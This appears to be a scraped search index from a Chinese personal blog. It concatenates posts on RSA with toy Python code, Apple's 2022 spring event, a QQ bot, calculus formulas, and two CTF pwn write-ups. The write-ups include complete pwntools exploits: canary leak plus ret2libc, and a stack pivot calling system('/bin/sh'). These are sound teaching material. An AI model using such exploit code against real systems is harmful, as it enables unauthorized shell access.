历史上常规的密码加解密算法的流程如下：\n假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。\n由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。\n因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。\n算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1\u0026lt;e\u0026lt;\\phi{(n)}\\)，且\\(e\\)与\\(\\phi{(n)}\\)互质 生成私钥 \\(d\\)，满足\\(ed\\equiv1(mod\\ \\phi{(n)})\\) 假设要发送的信息为\\(m\\)，则加解密规则成立： $$ m^e\\equiv c\\pmod{n}\\\\ c^d\\equiv m\\pmod{n} $$\n可靠性分析 考虑甲向乙发送一串数据，乙只需要向甲传送\\(n\\)和\\(e\\),甲就可以将加密完成的\\(c\\)发还给乙，由乙来进行解密操作。\n考虑第三方攻击者，只可能截获\\(n\\),\\(e\\),\\(c\\)，若要获取私钥\\(d\\)，则必须计算得\\(n\\)分解成的\\(p\\),\\(q\\)两数。\n而大质数的因式分解所需要的运算量是非常恐怖的。因此，当选定的\\(n\\)很大时，RSA算法几乎不可能被破解。\n总而言之：RSA利用的是，大数容易相乘，难以分解的特性，使得算法可靠。\n代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #RSA加解密算法实现 @copyright zeroy p=1000000007 q=998244353 n=p*q phi_n=(p-1)*(q-1) E=65537 def qkpow(a,b): ans=1 while b\u0026gt;0: if b%2==1: ans=ans*a%n a=a*a%n b=b//2 return ans def exgcd(a,b): if b==0: return 1,0,a else: x,y,q=exgcd(b,a%b) x,y=y,(x-(a//b)*y) return x,y,q # E**D=1(mod phi_n) def calcD(): x,y,q=exgcd(E,phi_n) return x+phi_n D=calcD() # C=m**E%n def encode(m): c=qkpow(m,E) return c # ans=c**D%n def decode(c): return qkpow(c,D) def main(): c=encode(234234) ans=decode(c) print(ans) main() 正确性证明 RSA算法过程以及正确性证明 - 简书 (jianshu.com)\n拓展知识 我们已经知道了RSA算法的流程，也知道了它的正确性，但是还有几个问题需要解决。\n既然大数分解十分困难，那我们该如何寻找两个大质数来作为\\(p\\),\\(q\\)呢？ 加解密运算中涉及到了大量的大数乘法取模，这是运算复杂度最高的部分，有没有一种方法可以优化\\(AB\\equiv C(mod\\ N)\\)运算的速度从而优化密钥生成的速度？ 方法是有的。可以采用Miller Rabin算法来对生成的大数进行质数检验，用蒙哥马利算法来优化大数相乘的复杂度，不过这不属于本文的主题，感兴趣的师傅可以自行了解。\n","permalink":"http://localhost:1313/articles/basic_RSA/","summary":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入 历史上常规的密码加解","title":"RSA算法详解"},{"content":" Apple 活动 - 2022 年 3 月 - Apple (中国大陆)\n2022年3月9日凌晨2点，我以当天的工图考试考爆为代价（虽然不看也会考爆），看了这场发布会。\n本场发布会苹果发布了新iPhone SE，iPad Air5，Mac Studio和Studio Display四款新品，iPhone13系列新增了配色。时长为1个小时的发布会内容不可谓不多，但万众期待的新MacBook Air和M2芯片没有发布。\n近两年Apple发布会给人的奇怪感觉 近两年关于Apple不再创新的论断已经几乎没有了，毫无疑问，Apple在个人电子设备领域不断地做出了一次又一次重大突破。遥记2020年Apple秋季发布会上登场的M1芯片，全新的架构为新设备带来了相当于老设备好几倍的性能，同时凭借ARM架构天然的省电特性，让仅重1.29kg的MacBook Air达到了惊人的18小时续航（我自己这台丐中丐版本8+256G版本MacBook Air实测开PD虚拟机打galgame一个多小时仅掉电7%，这可是经过了2层转译啊！）。\n去年10月份发布的M1 Pro和M1 Max芯片进一步加大了芯片组的规模，达到了相当于X86平台i7-11800H+RTX3060 laptop组合的性能，同时功耗大大降低，使得搭载这颗芯片的MacBook Pro实现了不插电与插电相同性能。\nM1 Pro 与 M1 Max 隆重登场：Apple 迄今打造的最强芯片 - Apple (中国大陆)\n同时由于高通摆烂和华为被制裁，Apple的老本行手机芯片与安卓阵营的差距进一步拉大，用苹果的原话说：“他们甚至还在追赶我们两年前发布的芯片！“\nApple在芯片上的巨大优势，使得近两年的发布会让人有种奇妙的感觉，”除了芯片没活儿了！“\n仔细想想，确实是这样。\niPhone SE用6年前的外观换最新的A15芯片，新品！\niPad Air5从A14升级到桌面级的M1芯片，性能翻倍！不能说提升不大吧？新品！\nStudio Display拿A13芯片当摄像头和音响驱动单元。最新的安卓旗舰手机打原神帧率甚至不如一个显示器（doge）。苹果仿佛在说：”我们知道显示器塞A13很奢侈，但没办法，这是我们在生产的性能最低的芯片。“（doge）你高通一届一届换了多少soc了，有用吗？换汤不换药啊！再下去要输显示器了，脸都不要了\n务实成了Apple发布会的主旋律。MacBook Pro14英寸和16英寸的版本外观梦回PowerPC时代，接口数大大增加。Apple的Pro系列产品终于开始真正”Pro“，完全以实用为导向，在保证实用的基础上，做到尽量高水平的工业设计。\n这些因素的共同作用导致现在Apple发布会的观感从没有创新到东西很好，但完全可预测。\n狠角色M1 Ultra Mac Studio 和 Studio Display 登场 |bilibili\nM1 Ultra | 颠覆游戏规则 |bilibili\nMac Studio - Apple (中国大陆)\n两个M1 Max粘在一起。\n看起来很简单粗暴，但是有很多问题可以深究。\n两颗SOC是如何进行通讯的呢？一颗CPU如何访问另一颗CPU的寄存器，缓存？怎么进行算力资源分配？怎么保证**”胶水工艺“**的功耗和发热？这都属于普通消费者难以感知到的创新，但毫无疑问需要超高技术力去实现。（所以Mac Pro的芯片直接四颗M1 Max粘一起就好了（bushi））\n这颗芯片的多核性能可以跟目前消费级市场霸主AMD线程撕裂者看齐，GPU性能看齐RTX3080桌面端，但这也带来了更多问题。\n处于阵痛期的Apple Silicon 这么强的芯片，我到底拿来干嘛？\n《三维大型场景渲染》（插件不支持ARM架构，怎么干活？没Cuda）\n《深度学习》（Cuda已成事实上的标准，没Cuda）\n《打游戏》（macOS上本来就没几个大作玩，现在换ARM架构，能玩的游戏就更少了）\n《编程》（解释型语言基本上适配了，但是编译型语言比如说C语言就很难用，gdb也不能用，学X86平台的汇编基本别想。。。）\n《Matlab》（MATLAB使用的是Intel MKL(Math Kernel Library)数学核心计算库，在英特尔芯片上能获得最佳性能）\n《虚拟化技术》（目前macOS平台最强虚拟化软件parallel desktop只支持安装针对ARM架构的操作系统，你苹果有能力号召厂商适配ARM架构，Windows/Linux平台可没办法快速适配ARM）\n《工业软件》（macOS奇缺）\n剪视频？它确实很能剪视频，对于专门剪视频的工作室来说，这机子顶配才不到70000就有了之前30万的Mac Pro2倍的性能和更小的体积，甚至很有性价比。\n但作为消费级最强芯片（可能），能干的事如此有限，是不是有点可惜？\n从专精于某一特定领域到相对通用化的过程一定是艰难的。未来相当长的一段时间里，Apple Silicon将继续在它自己划定的范围里秒天秒地，但对当今购买计算机产品的主力人群即游戏玩家和工业软件使用者来说，它将直接不在考虑的范围之内。\nmacOS”咖喱味“越来越重了，bug明显比之前用x86平台的时候多了不少(\n未来 过去苹果产品的性能不行导致众多生产力软件开发商和游戏开发者不愿意为苹果设备适配，但是如今Apple设备的性能全面跃进，也许以苹果的号召力，苹果会像如今在不到一年半的时间内让大部分常用软件适配Apple Silicon那样，在接下来的几年在多个领域全面开花也未可知。\n（所以现在最香的是轻薄本，常用软件都适配了且续航超长~\n现在英特尔/AMD与Apple涉及的领域不同，在非轻薄本领域几乎不构成直接竞争关系，随着Apple的生态越来越丰富，未来势必有场恶战。\n美企之间互相卷，可怜我国产芯片与人家差距进一步拉大。\n","permalink":"http://localhost:1313/articles/Appleevent2022/","summary":"Apple 活动 - 2022 年 3 月 - Apple (中国大陆) 2022年3月9日凌晨2点，我以当天的工图考试考爆为代价（虽然不看也会考爆），看了这场发布会。 本场发布会苹果","title":"写在Apple2022年春季发布会之后"},{"content":"canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。\n是否开启canary的编译选项：\n1 2 3 4 gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。\n如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。\nret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。\n如果这两者都不显性存在，就可以使用ret2libc方法。\n这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。\nlibc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\u0026quot;/bin/sh\u0026quot;) 来打开 shell。\n工作重心转向获取libc.so加载进内存的可利用的函数的地址。\n什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)\n深入理解GOT表和PLT表 - 知乎 (zhihu.com)\ngot表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com)\n简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。\n而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。\n例题：moeCTF2021 - baby canary checksec后发现开了NX和canary保护。\ncanary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。\n1 2 3 4 payload1=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+b\u0026#39;b\u0026#39; p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b\u0026#39;\\x00\u0026#39;)) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。\n1 2 3 4 5 payload2=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+p32(canary)+b\u0026#39;a\u0026#39;*12+p32(puts_plt)+p32(e.symbols[\u0026#34;main\u0026#34;])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\u0026#34;he flag!\\n\u0026#34;) puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。\n完整exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) local=1 e=ELF(\u0026#34;./baby_canary\u0026#34;) puts_got=e.got[\u0026#34;puts\u0026#34;] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\u0026#34;puts\u0026#34;] libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) def main(): if local: p=process(\u0026#34;./baby_canary\u0026#34;) else: p=remote(\u0026#34;114.67.175.224\u0026#34;,11482) p.recv() payload1=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+b\u0026#39;b\u0026#39; p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b\u0026#39;\\x00\u0026#39;)) p.recv() print(\u0026#34;canary: \u0026#34;,hex(canary)) payload2=b\u0026#39;a\u0026#39;*(0x4c-0x0c)+p32(canary)+b\u0026#39;a\u0026#39;*12+p32(puts_plt)+p32(e.symbols[\u0026#34;main\u0026#34;])+p32(puts_got) p.send(payload2) p.recvuntil(\u0026#34;he flag!\\n\u0026#34;) puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() p.recvuntil(\u0026#34;u are?\\n\u0026#34;) p.send(payload1) payload3=b\u0026#39;a\u0026#39;*(0x4c-0xc)+p32(canary)+b\u0026#39;a\u0026#39;*12+p32(system_addr)+b\u0026#39;aaaa\u0026#39;+p32(binsh_addr) p.send(payload3) p.interactive() main() 小插曲 实践中发现，在函数调用栈中除了该有的局部变量，有时会出现一些奇怪的变量，这是由编译器决定的，一般用于存储寄存器上下文。\n","permalink":"http://localhost:1313/articles/CTFpwn2/","summary":"canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了ca","title":"[PWN.0x01]canary|partial overwrite|ret2libc"},{"content":"前置知识：汇编语言（第4版）前半本\n注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret\n函数调用栈的基本结构 一些寄存器的作用：\nEIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。\nEBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。\nESP：始终指向栈顶。\n在进入一个函数时，会执行如下操作。\n1 2 3 push eip+4 push ebp mov ebp,esp 在执行完退出时，会执行如下操作。\n1 2 3 4 mov esp,ebp pop ebp pop eip 即leave和ret。\n整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。\n函数调用栈工作时的结构如下图：\n其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：\n1 2 3 4 void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。\n考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。\n但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。\n栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。\n也就是说，要构造栈中数据如图所示：\n至于为什么要-4，后面模拟的过程中读者自能体会。\n好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：\n然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：\n这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。\n例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)\n所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。\n惯例checksec，只开了NX。\nida分析得到：\n1 2 3 4 5 6 7 8 9 int vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); read(0, buf, 0x30u); return printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。\n第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。\n在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。\n结合文章开头函数调用栈的知识，不难理解，\u0026lsquo;bin/sh\u0026rsquo;和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。\n注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。\nEXP：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from psutil import process_iter from pwn import * context(arch=\u0026#34;i386\u0026#34;,log_level=\u0026#34;debug\u0026#34;) op=0 e=ELF(\u0026#34;ciscn-s-4.bin\u0026#34;) sys_addr=e.symbols[\u0026#39;system\u0026#39;] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\u0026#34;ciscn-s-4.bin\u0026#34;) else: zeroy=remote(\u0026#34;node4.buuoj.cn\u0026#34;,27827) payload1=b\u0026#39;a\u0026#39;*0x24+b\u0026#34;bbbb\u0026#34; zeroy.recvuntil(\u0026#34;name?\u0026#34;) zeroy.send(payload1) zeroy.recvuntil(\u0026#34;bbbb\u0026#34;) ebp_addr=u32(zeroy.recv(4)) print(\u0026#34;ebp_addr: \u0026#34;,hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b\u0026#39;aaaa\u0026#39;+p32(buf_addr+12)+b\u0026#39;/bin/sh\\x00\u0026#39; payload2=payload2.ljust(0x28,b\u0026#39;a\u0026#39;)+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() ","permalink":"http://localhost:1313/articles/CTFpwn1/","summary":"前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色","title":"[PWN.0x00]函数调用栈结构与栈迁移"},{"content":"前言 2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。\n概述 项目地址：zeroy0410/NoyaBot (github.com)\n配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。\n我使用了Python-Flask作为项目的框架。\n机器人功能（截止2022/3/3）\n闲聊 回答指定的问题 设定回答问题的概率 数学计算 计算能用一行字符串表示的Sympy库格式的数据 一言 翻译 1 2 3 4 5 6 7 /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项 数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。\n","permalink":"http://localhost:1313/articles/noya/","summary":"前言 2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。 概述 项目地址：zeroy0410/NoyaBot (github.com) 配置完go-cqhttp的基","title":"基于go-cqhttp的机器人NoyaBot"},{"content":"高等数学上册(微积分)必背公式总结 - 知乎 (zhihu.com)\n导数： $$ \\begin{align} \u0026amp;[\\cos(\\omega x+\\varphi)]^{(n)}=\\omega^n\\cos(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \u0026amp;[\\sin(\\omega x+\\varphi)]^{(n)}=\\omega^n\\sin(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \\end{align} $$\n重难点公式： $$ \\begin{align} \u0026amp;\\int\\frac{1}{a^2+x^2}dx=\\frac{1}{a}arctan\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{a^2-x^2}dx=\\frac{1}{2a}ln|\\frac{a+x}{a-x}|+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{a^2-x^2}}dx=arcsin\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x^2\\pm a^2}}dx=ln|x+\\sqrt{x^2\\pm a^2}|+C\\\\ \u0026amp;\\int{tan\\ x}dx=-ln|cos\\ x|+C\\\\ \u0026amp;\\int{cot\\ x}dx=ln|sin\\ x|+C\\\\ \u0026amp;\\int{csc\\ x}dx=ln|csc\\ x-cot\\ x|+C\\\\ \u0026amp;\\int{sec\\ x}dx=ln|sec\\ x+tan\\ x|+C\\\\ \u0026amp;\\int{sec^2\\ x}dx=tan\\ x+C\\\\ \u0026amp;\\int{csc^2\\ x}dx=-cot\\ x+C\\\\ \u0026amp;\\int{sec\\ x*tan\\ x}dx=sec\\ x+C\\\\ \u0026amp;\\int{csc\\ x*cot\\ x}dx=-csc\\ x+C\\\\ \\end{align} $$\n凑系数，拆项： $$ \\int{\\frac{x}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3-3}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3}{(2x+3)^2}}dx-\\frac{1}{2}\\int\\frac{3}{(2x+3)^2}dx\\ \u0026hellip; $$ 分子包含多项的，直接无法求解可以拆项求。\n常见的配凑： $$ \\begin{align} \u0026amp;xe^x:\\\\ \u0026amp;\\int\\frac{1+x}{x(xe^x+1)}dx=\\int\\frac{(1+x)e^x}{xe^x(xe^x+1)}dx=\\int\\frac{1}{xe^x(xe^x+1)}d(xe^x)\\overset{t=xe^x}=\\int\\frac{1}{t(t+1)}dt\\\\ \u0026amp;xlnx:\\\\ \u0026amp;\\int\\frac{(1+lnx)dx}{1+x^2ln^2x}=\\int\\frac{1}{1+(xlnx)^2}d(xlnx)\\\\ \u0026amp;\\frac{1}{\\sqrt{x}}:\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x(x+4)}}dx=2\\int\\frac{1}{2\\sqrt{x}\\sqrt{x+4}}dx=2\\int\\frac{1}{\\sqrt{4+\\sqrt{x}^2}}d{\\sqrt{x}}\\\\ \u0026amp;e^x:\\\\ \u0026amp;\\int f(e^x){\\rm dx}=\\int\\frac{f(e^x)}{e^x}{\\rm de^x}=\\int\\frac{f(t)}{t}{\\rm dt} \\end{align} $$\n一些题目： 1. $$ \\begin{align} (1):\\int\\frac{\\rm dx}{x\\sqrt{x^2-1}} \u0026amp;=\\int\\frac{\\rm dx}{x^2\\sqrt{1-\\left(\\frac{1}{x}\\right)^2}}\\\\ \u0026amp;=-\\int\\frac{\\rm d\\frac{1}{x}}{\\sqrt{1-\\left(\\frac{1}{x}\\right)^2}}\\\\ \u0026amp;=-\\arcsin\\frac{1}{x}+C\\\\ \\end{align} $$ 2. $$ \\begin{align} (2):\\int\\frac{x{\\rm dx}}{x^2\\sqrt{x^2-1}}\u0026amp; =\\int\\frac{\\rm d\\sqrt{x^2-1}}{(\\sqrt{x^2-1})^2+1}\\\\ \u0026amp;=\\arctan\\sqrt{x^2-1}+C \\end{align} $$ 3. $$ (3)令\\sqrt{x^2-1}=x-t,有x=\\frac{t^2+1}{2t}\\\\ \\begin{align} \\int\\frac{\\rm dx}{x\\sqrt{x^2-1}} \u0026amp;=-2\\int\\frac{\\rm dt}{t^2+1}\\\\ \u0026amp;=-2\\arctan t+C\\\\ \u0026amp;=-2\\arctan(x-\\sqrt{x^2-1})+C \\end{align} $$ 4. $$ \\begin{align} (4)I=\\int\\sqrt{Ax^2+B}{\\rm dx} \u0026amp;=x\\sqrt{Ax^2+B}-\\int\\frac{(Ax^2+B)-B}{\\sqrt{Ax^2+B}}{\\rm dx}\\\\ \u0026amp;=x\\sqrt{Ax^2+B}-I+\\int\\frac{B}{\\sqrt{Ax^2+B}}{\\rm dx} \\end{align} $$\n奇怪的配凑： $$ \\int\\frac{1}{\\sqrt{e^{2x}-1}}dx=\\int\\frac{1}{\\sqrt{e^{2x}(1-e^{-2x})}}dx=\\int\\frac{e^{-x}}{\\sqrt{1-e^{-2x}}} $$ 有理函数积分： $$ \\begin{align} \u0026amp;\\int\\frac{x-2}{x^2+x+1}dx=\\int\\frac{A(x^2+x+1)\u0026rsquo;+B}{x^2+x+1}dx\\\\ \u0026amp;A(2x+1)+B=x-2=\u0026gt;A=\\frac{1}{2},B=-\\frac{5}{2}\\\\ \u0026amp;=\\frac{1}{2}\\int\\frac{1}{x^2+x+1}d(x^2+x+1)-\\frac{5}{2}\\int\\frac{1}{x^2+x+1}dx\\\\ \u0026amp;=\\frac{1}{2}\\int\\frac{1}{x^2+x+1}d(x^2+x+1)-\\frac{5}{2}\\int\\frac{1}{(x+\\frac{1}{2})^2+\\frac{3}{4}}\\\\ \u0026amp;\\text{ps:当分母}\\triangle\u0026lt;0\\text{时才可以使用,否则直接裂项即可} \\end{align} $$ 表格法求积分：\n不定积分表格法的本质(推导) - 知乎 (zhihu.com) $$ \\int{x^2e^{2x}}dx=\\frac{1}{2}x^2e^{2x}-\\frac{1}{2}xe^{2x}+\\frac{1}{4}e^{2x}+C $$ 常见三角换元题： $$ \\begin{align} \u0026amp;\\int\\frac{x^2}{\\sqrt{1-x^2}}dx\\overset{x=sint}{=}\\int\\frac{sin^2t}{\\sqrt{1-sin^2t}}costdt=\\int{sintdt}\\\\ \u0026amp;\\int{x^2{\\sqrt{4-x^2}}}dx\\overset{x=2sint}{=}16\\int{sin^2tcos^2t}dt=8\\int{(\\frac{1}{2}sin2t)^2}dt\\\\ \\end{align} $$ 凑微分： $$ \\begin{align} \u0026amp;\\int\\frac{1}{x\\sqrt{1+x^2}}dx=\\int{\\frac{x}{x^2\\sqrt{1+x^2}}}dx=\\frac{1}{2}\\int{\\frac{1}{x^2\\sqrt{1+x^2}}}dx^2\\overset{t=x^2}{=}\\frac{1}{2}\\int{\\frac{1}{t\\sqrt{1+t}}}dt\\\\ \u0026amp;set\\ u=\\sqrt{1+t}\\\\ \u0026amp;=\\frac{1}{2}\\int{\\frac{2u}{(u^2-1)u}}du=\\int{\\frac{1}{u^2-1}}du=-\\frac{1}{2}ln|\\frac{1+u}{1-u}|+C \\end{align} $$ 倒代换： $$ \\int{\\frac{1}{x\\sqrt{x^4+x^2+1}}}dx\\overset{t=\\frac{1}{x}}{=}-\\int{\\frac{1}{\\frac{1}{t}\\sqrt{\\frac{1}{t^4}+\\frac{1}{t^2}+1}}}dx=-\\frac{\\frac{1}{t}}{\\sqrt{\\frac{1}{t^4}+\\frac{1}{t^2}+1}}dt=-\\frac{1}{2}\\int{\\frac{1}{\\sqrt{(t^2+\\frac{1}{2})^2+(\\frac{\\sqrt{3}}{2})^2}}}d(t^2+\\frac{1}{2}) $$\n一些巧题： $$ \\begin{align} \u0026amp;\\int{\\frac{1}{x\\sqrt{x^2-1}}}dx=\\int{\\frac{1}{x\\sqrt{x^2(1-\\frac{1}{x^2})}}}dx=\\int{\\frac{1}{x^2\\sqrt{1-\\frac{1}{x^2}}}}=-\\int{\\frac{1}{\\sqrt{1-(\\frac{1}{x})^2}}}d(\\frac{1}{x})\\\\ \u0026amp;\\int{\\frac{1-lnx}{(x-lnx)^2}}dx=\\int{\\frac{\\frac{1-lnx}{x^2}}{(1-\\frac{lnx}{x})^2}}dx=-\\int{\\frac{1}{(1-\\frac{lnx}{x})^2}}d(1-\\frac{lnx}{x})\\\\ \u0026amp;\\int{\\frac{1+x^2}{1+x^4}}dx=\\int{\\frac{\\frac{1}{x^2}+1}{\\frac{1}{x^2}+x^2}}dx=\\int{\\frac{d(x-\\frac{1}{x})}{(x-\\frac{1}{x})^2+2}}\\\\ \u0026amp;\\int{\\frac{1}{1+x^4}}dx=\\frac{1}{2}\\int{\\frac{1+x^2-(x^2-1)}{1+x^4}}dx\\\\ \\end{align} $$\n","permalink":"http://localhost:1313/articles/math-integrate/","summary":"高等数学上册(微积分)必背公式总结 - 知乎 (zhihu.com) 导数： $$ \\begin{align} \u0026amp;[\\cos(\\omega x+\\varphi)]^{(n)}=\\omega^n\\cos(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \u0026amp;[\\sin(\\omega x+\\varphi)]^{(n)}=\\omega^n\\sin(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \\end{align} $$ 重难点公式： $$ \\begin{align} \u0026amp;\\int\\frac{1}{a^2+x^2}dx=\\frac{1}{a}arctan\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{a^2-x^2}dx=\\frac{1}{2a}ln|\\frac{a+x}{a-x}|+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{a^2-x^2}}dx=arcsin\\frac{x}{a}+C\\\\ \u0026amp;\\int\\frac{1}{\\sqrt{x^2\\pm a^2}}dx=ln|x+\\sqrt{x^2\\pm a^2}|+C\\\\ \u0026amp;\\int{tan\\ x}dx=-ln|cos\\ x|+C\\\\ \u0026amp;\\int{cot\\ x}dx=ln|sin\\ x|+C\\\\ 